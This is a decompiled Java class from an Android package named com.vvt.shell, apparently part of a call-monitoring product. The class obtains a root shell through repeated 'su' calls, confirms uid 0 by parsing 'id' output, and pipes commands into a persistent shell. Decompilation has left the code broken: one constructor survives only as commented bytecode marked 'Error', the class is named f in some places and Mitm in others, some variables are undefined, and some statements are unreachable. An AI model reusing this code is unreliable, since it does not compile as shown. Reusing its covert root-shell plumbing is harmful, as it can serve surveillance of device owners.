package com.vvt.shell;

import android.os.SystemClock;
import android.util.Log;
import com.vvt.shell.compat.FileCompat;
import java.io.File;
import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class f
{
  public static final String a;
  private boolean b;
  private FileDescriptor c;
  private FileInputStream d;
  private FileOutputStream e;
  private int f;
  
  static
  {
    Object[] arrayOfObject = new Object[1];
    arrayOfObject[0] = "fxexec";
    a = String.format("lib%s.so", arrayOfObject);
  }
  
  /* Error */
  private f()
  {
    // Byte code:
    //   0: iconst_1
    //   1: istore_1
    //   2: aload_0
    //   3: invokespecial 33	java/lang/Object:<init>	()V
    //   6: aload_0
    //   7: iconst_0
    //   8: putfield 35	com/vvt/shell/Mitm:b	Z
    //   11: aload_0
    //   12: iconst_0
    //   13: putfield 37	com/vvt/shell/Mitm:Mitm	I
    //   16: iload_1
    //   17: newarray <illegal type>
    //   19: astore_2
    //   20: ldc 39
    //   22: invokestatic 45	java/lang/System:getenv	(Ljava/lang/String;)Ljava/lang/String;
    //   25: astore_3
    //   26: aload_0
    //   27: aload_3
    //   28: invokespecial 47	com/vvt/shell/Mitm:b	(Ljava/lang/String;)Ljava/lang/String;
    //   31: astore_3
    //   32: iconst_3
    //   33: istore 4
    //   35: iload 4
    //   37: anewarray 23	java/lang/String
    //   40: astore 5
    //   42: aload 5
    //   44: iconst_0
    //   45: ldc 50
    //   47: aastore
    //   48: new 52	java/lang/StringBuilder
    //   51: astore 6
    //   53: aload 6
    //   55: invokespecial 53	java/lang/StringBuilder:<init>	()V
    //   58: ldc 55
    //   60: astore 7
    //   62: aload 6
    //   64: aload 7
    //   66: invokevirtual 59	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   69: aload_3
    //   70: invokevirtual 59	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   73: invokevirtual 63	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   76: astore_3
    //   77: aload 5
    //   79: iload_1
    //   80: aload_3
    //   81: aastore
    //   82: iconst_2
    //   83: istore 8
    //   85: ldc 66
    //   87: astore 6
    //   89: aload 5
    //   91: iload 8
    //   93: aload 6
    //   95: aastore
    //   96: aload_0
    //   97: aload_2
    //   98: ldc 68
    //   100: aload 5
    //   102: invokespecial 71	com/vvt/shell/Mitm:getInstance	([ILjava/lang/String;[Ljava/lang/String;)Ljava/io/FileDescriptor;
    //   105: astore_3
    //   106: aload_0
    //   107: aload_3
    //   108: putfield 73	com/vvt/shell/Mitm:c	Ljava/io/FileDescriptor;
    //   111: new 75	java/io/FileInputStream
    //   114: astore_3
    //   115: aload_0
    //   116: getfield 73	com/vvt/shell/Mitm:c	Ljava/io/FileDescriptor;
    //   119: astore 5
    //   121: aload_3
    //   122: aload 5
    //   124: invokespecial 78	java/io/FileInputStream:<init>	(Ljava/io/FileDescriptor;)V
    //   127: aload_0
    //   128: aload_3
    //   129: putfield 80	com/vvt/shell/Mitm:d	Ljava/io/FileInputStream;
    //   132: new 82	java/io/FileOutputStream
    //   135: astore_3
    //   136: aload_0
    //   137: getfield 73	com/vvt/shell/Mitm:c	Ljava/io/FileDescriptor;
    //   140: astore 5
    //   142: aload_3
    //   143: aload 5
    //   145: invokespecial 83	java/io/FileOutputStream:<init>	(Ljava/io/FileDescriptor;)V
    //   148: aload_0
    //   149: aload_3
    //   150: putfield 85	com/vvt/shell/Mitm:e	Ljava/io/FileOutputStream;
    //   153: aload_2
    //   154: iconst_0
    //   155: iaload
    //   156: istore 9
    //   158: aload_0
    //   159: iload 9
    //   161: putfield 37	com/vvt/shell/Mitm:Mitm	I
    //   164: new 87	com/vvt/shell/g
    //   167: astore_2
    //   168: aload_2
    //   169: aload_0
    //   170: invokespecial 90	com/vvt/shell/g:<init>	(Lcom/vvt/shell/Mitm;)V
    //   173: new 92	java/lang/Thread
    //   176: astore_3
    //   177: aload_3
    //   178: aload_2
    //   179: ldc 94
    //   181: invokespecial 97	java/lang/Thread:<init>	(Ljava/lang/Runnable;Ljava/lang/String;)V
    //   184: aload_3
    //   185: invokevirtual 100	java/lang/Thread:start	()V
    //   188: new 102	com/vvt/shell/e
    //   191: astore_2
    //   192: aload_2
    //   193: invokespecial 103	com/vvt/shell/e:<init>	()V
    //   196: new 105	com/vvt/shell/h
    //   199: astore_3
    //   200: aload_0
    //   201: getfield 80	com/vvt/shell/Mitm:d	Ljava/io/FileInputStream;
    //   204: astore 5
    //   206: aload_3
    //   207: aload_2
    //   208: aload 5
    //   210: invokespecial 108	com/vvt/shell/h:<init>	(Lcom/vvt/shell/e;Ljava/io/FileInputStream;)V
    //   213: aload_3
    //   214: invokevirtual 109	com/vvt/shell/h:start	()V
    //   217: aload_2
    //   218: invokevirtual 111	com/vvt/shell/e:getInstance	()V
    //   221: aload_2
    //   222: invokevirtual 113	com/vvt/shell/e:c	()Ljava/lang/String;
    //   225: astore_2
    //   226: aload_2
    //   227: ifnull +8 -> 235
    //   230: aload_3
    //   231: invokevirtual 116	com/vvt/shell/h:interrupt	()V
    //   234: return
    //   235: aload_0
    //   236: invokevirtual 118	com/vvt/shell/Mitm:d	()V
    //   239: new 120	java/lang/Exception
    //   242: astore_2
    //   243: aload_2
    //   244: ldc 122
    //   246: invokespecial 125	java/lang/Exception:<init>	(Ljava/lang/String;)V
    //   249: aload_2
    //   250: athrow
    //   251: athrow
    //   252: astore_2
    //   253: goto -19 -> 234
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	256	0	this	Mitm
    //   1	79	1	i	int
    //   19	231	2	localObject1	Object
    //   252	1	2	localException	Exception
    //   25	206	3	localObject2	Object
    //   33	3	4	j	int
    //   40	169	5	localObject3	Object
    //   51	43	6	localObject4	Object
    //   60	5	7	str	String
    //   83	9	8	k	int
    //   156	4	9	m	int
    // Exception table:
    //   from	to	target	type
    //   230	234	251	finally
    //   230	234	252	java/lang/Exception
  }
  
  public static f a()
  {
    Class localClass = f.class;
    Object localObject = null;
    while (localObject == null) {
      try
      {
        f localf2 = new com/vvt/shell/f;
        localf2.<init>();
        localObject = localf2;
      }
      catch (Exception localException)
      {
        long l = 1000L;
        SystemClock.sleep(l);
      }
      finally {}
    }
    return localf1;
  }
  
  private FileDescriptor a(int[] paramArrayOfInt, String paramString, String[] paramArrayOfString)
  {
    int i = 1;
    Object localObject1 = c(paramString);
    Object localObject2 = null;
    Object localObject3;
    String str2;
    String str1;
    try
    {
      localObject2 = ((ArrayList)localObject1).get(0);
      localObject2 = (String)localObject2;
      localObject3 = new java/io/File;
      ((File)localObject3).<init>((String)localObject2);
      boolean bool1 = ((File)localObject3).exists();
      if (!bool1)
      {
        localObject1 = "Shell";
        localObject3 = new java/lang/StringBuilder;
        ((StringBuilder)localObject3).<init>();
        str2 = "Shell ";
        localObject3 = ((StringBuilder)localObject3).append(str2);
        localObject3 = ((StringBuilder)localObject3).append((String)localObject2);
        str2 = " not found!";
        localObject3 = ((StringBuilder)localObject3).append(str2);
        localObject3 = ((StringBuilder)localObject3).toString();
        Log.e((String)localObject1, (String)localObject3);
        localObject1 = new java/io/FileNotFoundException;
        ((FileNotFoundException)localObject1).<init>((String)localObject2);
        throw ((Throwable)localObject1);
      }
    }
    catch (Exception localException)
    {
      localObject1 = c("/system/bin/sh -");
      str1 = (String)((ArrayList)localObject1).get(0);
      localObject3 = new String[i];
      localObject1 = (String[])((ArrayList)localObject1).toArray((Object[])localObject3);
    }
    for (;;)
    {
      return Exec.createSubprocess(str1, (String[])localObject1, paramArrayOfString, paramArrayOfInt);
      boolean bool2 = FileCompat.a((File)localObject3);
      if (!bool2)
      {
        localObject1 = "Shell";
        localObject3 = new java/lang/StringBuilder;
        ((StringBuilder)localObject3).<init>();
        str2 = "Shell ";
        localObject3 = ((StringBuilder)localObject3).append(str2);
        localObject3 = ((StringBuilder)localObject3).append(str1);
        str2 = " not executable!";
        localObject3 = ((StringBuilder)localObject3).append(str2);
        localObject3 = ((StringBuilder)localObject3).toString();
        Log.e((String)localObject1, (String)localObject3);
        localObject1 = new java/io/FileNotFoundException;
        ((FileNotFoundException)localObject1).<init>(str1);
        throw ((Throwable)localObject1);
      }
      bool2 = true;
      localObject3 = new String[bool2];
      localObject1 = ((ArrayList)localObject1).toArray((Object[])localObject3);
      localObject1 = (String[])localObject1;
    }
  }
  
  private void a(boolean paramBoolean)
  {
    this.b = paramBoolean;
  }
  
  public static f b()
  {
    synchronized (f.class)
    {
      Object localObject1 = a();
      boolean bool1 = ((f)localObject1).c();
      if (!bool1) {
        localObject1 = b((f)localObject1);
      }
      int i = c((f)localObject1);
      if (i == 0)
      {
        i = 1;
        ((f)localObject1).a(i);
      }
      boolean bool2 = ((f)localObject1).c();
      if (bool2) {
        return (f)localObject1;
      }
      ((f)localObject1).d();
      localObject1 = new com/vvt/shell/CannotGetRootShellException;
      String str = "Failed to acquire root shell!";
      ((CannotGetRootShellException)localObject1).<init>(str);
      throw ((Throwable)localObject1);
    }
  }
  
  private static f b(f paramf)
  {
    int i = 5;
    for (String str1 = paramf.a("su");; str1 = paramf.a("su"))
    {
      String str2 = "ATV0E0";
      boolean bool = str1.contains(str2);
      if ((!bool) || (i < 0)) {
        break;
      }
      i += -1;
      paramf.d();
      paramf = a();
    }
    return paramf;
  }
  
  private String b(String paramString)
  {
    String[] arrayOfString = paramString.split(":");
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    int i = paramString.length();
    localStringBuilder.<init>(i);
    int j = arrayOfString.length;
    i = 0;
    while (i < j)
    {
      String str = arrayOfString[i];
      File localFile = new java/io/File;
      localFile.<init>(str);
      boolean bool1 = localFile.isDirectory();
      if (bool1)
      {
        boolean bool2 = FileCompat.a(localFile);
        if (bool2)
        {
          localStringBuilder.append(str);
          str = ":";
          localStringBuilder.append(str);
        }
      }
      i += 1;
    }
    i = localStringBuilder.length() + -1;
    return localStringBuilder.substring(0, i);
  }
  
  private static int c(f paramf)
  {
    int i = -1;
    Object localObject = paramf.a("id");
    if (localObject != null)
    {
      Pattern localPattern = Pattern.compile("uid=(.*?)\\(.*gid=(.*?)\\(");
      localObject = localPattern.matcher((CharSequence)localObject);
      boolean bool = ((Matcher)localObject).find();
      if (bool)
      {
        String str = ((Matcher)localObject).group(1);
        i = Integer.parseInt(str);
        int j = 2;
        localObject = ((Matcher)localObject).group(j);
        Integer.parseInt((String)localObject);
      }
    }
    return i;
  }
  
  private ArrayList c(String paramString)
  {
    int i = 34;
    int j = 2;
    int k = 1;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    int m = paramString.length();
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    int n = 0;
    String str1 = null;
    int i1 = k;
    if (n < m)
    {
      char c1 = paramString.charAt(n);
      boolean bool;
      String str2;
      if (i1 == 0)
      {
        bool = Character.isWhitespace(c1);
        if (bool)
        {
          str2 = localStringBuilder.toString();
          localArrayList.add(str2);
          i1 = localStringBuilder.length();
          localStringBuilder.delete(0, i1);
          i1 = k;
        }
      }
      for (;;)
      {
        n += 1;
        break;
        if (c1 == i)
        {
          i1 = j;
        }
        else
        {
          localStringBuilder.append(c1);
          continue;
          if (i1 == k)
          {
            bool = Character.isWhitespace(c1);
            if (!bool) {
              if (c1 == i)
              {
                i1 = j;
              }
              else
              {
                localStringBuilder.append(c1);
                i1 = 0;
                str2 = null;
              }
            }
          }
          else if (i1 == j)
          {
            char c2 = '\\';
            int i2;
            if (c1 == c2)
            {
              i2 = n + 1;
              if (i2 < m)
              {
                n += 1;
                i2 = paramString.charAt(n);
                localStringBuilder.append(i2);
              }
            }
            else if (i2 == i)
            {
              i1 = 0;
              str2 = null;
            }
            else
            {
              localStringBuilder.append(i2);
            }
          }
        }
      }
    }
    n = localStringBuilder.length();
    if (n > 0)
    {
      str1 = localStringBuilder.toString();
      localArrayList.add(str1);
    }
    return localArrayList;
  }
  
  public String a(String paramString)
  {
    String str1 = null;
    Object localObject2 = "%s\r";
    int i = 1;
    for (;;)
    {
      Object localObject3;
      StringBuilder localStringBuilder;
      Object localObject4;
      String str2;
      long l1;
      int j;
      int m;
      boolean bool2;
      boolean bool1;
      try
      {
        localObject3 = new Object[i];
        localStringBuilder = null;
        localObject3[0] = paramString;
        localObject2 = String.format((String)localObject2, (Object[])localObject3);
        i = 4096;
        localObject3 = new byte[i];
        localStringBuilder = new java/lang/StringBuilder;
        localStringBuilder.<init>();
      }
      finally {}
      try
      {
        localObject4 = this.e;
        str2 = "UTF-8";
        localObject2 = ((String)localObject2).getBytes(str2);
        ((FileOutputStream)localObject4).write((byte[])localObject2);
        localObject2 = this.e;
        ((FileOutputStream)localObject2).flush();
        l1 = System.currentTimeMillis();
        l2 = 15000L;
        l1 += l2;
        localObject2 = this.d;
        j = ((FileInputStream)localObject2).available();
        if (j <= 0) {
          continue;
        }
        if (j <= 0) {
          continue;
        }
        localObject2 = this.d;
        j = ((FileInputStream)localObject2).read((byte[])localObject3);
        localObject4 = new java/lang/String;
        str2 = null;
        ((String)localObject4).<init>((byte[])localObject3, 0, j);
        localStringBuilder.append((String)localObject4);
        localObject2 = localStringBuilder.toString();
        localObject4 = "[\r][\n]";
        localObject2 = ((String)localObject2).split((String)localObject4);
        m = localObject2.length;
        if (m == 0) {
          continue;
        }
        m = localObject2.length + -1;
        localObject2 = localObject2[m];
        localObject2 = ((String)localObject2).trim();
        localObject4 = "#";
        bool2 = ((String)localObject2).endsWith((String)localObject4);
        if (!bool2)
        {
          localObject4 = "$";
          bool2 = ((String)localObject2).endsWith((String)localObject4);
          if (!bool2)
          {
            localObject4 = "sqlite>";
            bool1 = ((String)localObject2).endsWith((String)localObject4);
            if (!bool1) {
              continue;
            }
          }
        }
        str1 = localStringBuilder.toString();
      }
      catch (IOException localIOException)
      {
        continue;
      }
      return str1;
      long l2 = 1L;
      try
      {
        Thread.sleep(l2);
        l2 = System.currentTimeMillis();
        bool1 = l2 < l1;
        if (!bool1) {
          continue;
        }
        int k = -1;
        continue;
        if (k > 0) {
          continue;
        }
        str1 = localStringBuilder.toString();
      }
      catch (Exception localException) {}
    }
  }
  
  public boolean c()
  {
    return this.b;
  }
  
  public void d()
  {
    int i = this.f;
    Exec.hangupProcessGroup(i);
    Object localObject = this.c;
    if (localObject != null)
    {
      Exec.close(this.c);
      i = 0;
      localObject = null;
      this.c = null;
    }
    localObject = this.d;
    if (localObject != null) {}
    try
    {
      localObject = this.d;
      ((FileInputStream)localObject).close();
    }
    catch (IOException localIOException2)
    {
      for (;;) {}
    }
    localObject = this.e;
    if (localObject != null) {}
    try
    {
      localObject = this.e;
      ((FileOutputStream)localObject).close();
      return;
    }
    catch (IOException localIOException1)
    {
      for (;;) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/shell/Mitm.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */